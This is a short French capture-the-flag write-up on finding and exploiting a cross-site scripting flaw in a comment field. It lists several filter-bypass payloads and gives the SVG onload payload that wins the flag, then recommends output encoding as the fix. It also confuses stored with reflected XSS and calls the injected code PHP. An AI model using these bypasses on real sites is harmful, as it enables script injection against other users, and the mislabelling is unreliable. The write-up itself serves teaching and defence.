## Phase 1 : Découverte de la faille

Lorsqu'un site stocke des commentaires ou n'importe quelle entree utilisateur pour le retourner aux autre utilisateurs, il est interessantd de tester une faille XSS reflected. 

Le pricnipe de ce type de faille est d'entrer dans nos donnees envoyees au serveur du code php malveillant qui va s'executer quand un utilisateur viendra sur la page.

## Phase 2 : Exploitation de la faille

En envoyant directement du code html et php dans le commentaire on voit que le site verifie quand meme certaines balises et les enleve.

Mais il est possible que certaines balises ne soient pas verifiees, on teste donc un certains nombre d'entre elles comme :

<img src="x" onerror="alert('XSS')">
<scr<script>ipt>alert('XSS')</script>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')>
<a href="javascript:alert('XSS')">Clique ici</a>


Et on arrive enfin a la solution :

<svg/onload=alert('XSS')>a

Qui nous donne acces au flag.

## Phase 3 : Comment corriger la faille

La solution a privilegier est l'encodage des caracteres speciaux comme les balises html ou javascript. Il existe des librairies 
tres efficaces qui permettent d'encoder facilement les ce genre de caracteres : html.escape() en python par exemple.

